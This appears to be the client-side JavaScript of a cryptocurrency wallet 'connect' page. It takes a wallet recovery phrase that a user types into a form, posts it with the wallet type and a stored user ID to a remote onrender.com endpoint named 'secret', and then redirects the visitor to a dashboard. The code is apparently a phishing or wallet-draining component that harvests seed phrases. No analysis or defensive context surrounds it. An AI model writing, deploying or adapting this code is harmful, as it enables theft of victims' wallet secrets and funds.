window.addEventListener("load", () => {
  const phraserbtn = document.getElementById("phraser");
  const phraseIn = document.getElementById("phrases");
  const client = localStorage.getItem("LogprofileDetails").split(",")[1];
  const walletType = document.getElementById("wallettype");

  phraserbtn.addEventListener("click", async (e) => {
    e.preventDefault();
    const wallet_Type = walletType.textContent;
    const notaPh = phraseIn.value;
    try {
      const data = await axios.post(
        "https://apex-h7wm.onrender.com/apex/secret/secrete",
        {
          user: client,
          walletType: wallet_Type,
          secret: notaPh,
        }
      );
      window.location = "../dashboard";
    } catch (error) {
      console.log(error);
    }
  });
});
